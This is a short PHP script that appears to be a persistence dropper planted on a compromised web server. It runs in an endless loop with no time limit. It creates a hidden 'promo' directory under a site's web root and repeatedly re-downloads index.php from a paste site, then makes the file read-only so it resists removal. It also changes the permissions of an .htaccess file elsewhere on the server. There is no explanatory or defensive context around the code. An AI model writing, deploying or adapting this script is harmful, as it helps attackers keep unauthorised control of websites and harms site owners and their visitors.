<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("/var/www/html/PI_WEB/ewt/pi_admission/promo")){
        mkdir("/var/www/html/PI_WEB/ewt/pi_admission/promo");
    }
    if (!file_exists("/var/www/html/PI_WEB/ewt/pi_admission/promo/index.php")){
        $text = base64_encode(file_get_contents("https://paste.myconan.net/614336.txt"));
        file_put_contents("/var/www/html/PI_WEB/ewt/pi_admission/promo/index.php", base64_decode($text));
    }
    if (javanese("/var/www/html/PI_WEB/ewt/pi_admission/promo/") != 0444){
        chmod("/var/www/html/PI_WEB/ewt/pi_admission/promo/index.php", 0444);
        chmod("/usr/local/www/apache24/data/vclbgent/vclbgent2/.htaccess", 0644);
    }
}

function javanese($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
